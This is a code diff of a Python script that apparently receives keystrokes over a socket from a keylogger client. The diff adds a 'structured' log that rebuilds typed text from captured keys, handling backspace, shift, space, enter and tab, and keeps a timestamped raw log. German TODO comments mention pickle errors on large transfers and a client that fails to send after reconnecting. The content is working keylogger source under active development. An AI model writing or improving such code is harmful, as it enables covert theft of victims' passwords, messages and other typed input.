@@ -23,10 +23,40 @@ class Socket:
             Socket.connection_established = False
 
 
+class Global_Variables:
+    shift_pressed = False
+
+
 def write_to_log_file(character):
-    with open("Logfile.txt", "a+")as log_file:
+    with open("Logfile_not_structured.txt", "a+")as log_file:
         character = str(character)
         log_file.write(str(datetime.datetime.now()) + f"  {character}" + "\n")
+
+    with open("Logfile_structured.txt", "a+")as log_file:
+        if character == "Key.backspace":
+            with open("Logfile_structured.txt", "r")as temp_log_file:
+                temp = temp_log_file.read()
+            with open("Logfile_structured.txt", "w")as temp_log_file:
+                temp_log_file.write(temp[0:-1])
+
+        elif character == "Key.shift":
+            Global_Variables.shift_pressed = True
+
+        elif character == "Key.space":
+            log_file.write(" ")
+
+        elif character == "Key.enter":
+            log_file.write("\n")
+
+        elif character == "Key.tab":
+            log_file.write("\t")
+
+        else:
+            if Global_Variables.shift_pressed:
+                log_file.write(character.capitalize())
+                Global_Variables.shift_pressed = False
+            else:
+                log_file.write(character)
 
 
 connection = Socket()
@@ -52,5 +82,6 @@ while True:
             print(data_rec)
 
 
-#Log File formatten
+#Log File formatten mit permanent shift
 #Große arrays richtig verwalten ohne _pickle.UnpicklingError: pickle data was truncated
+#Client sendet nicht wenn er sich des zweite mal verbindet
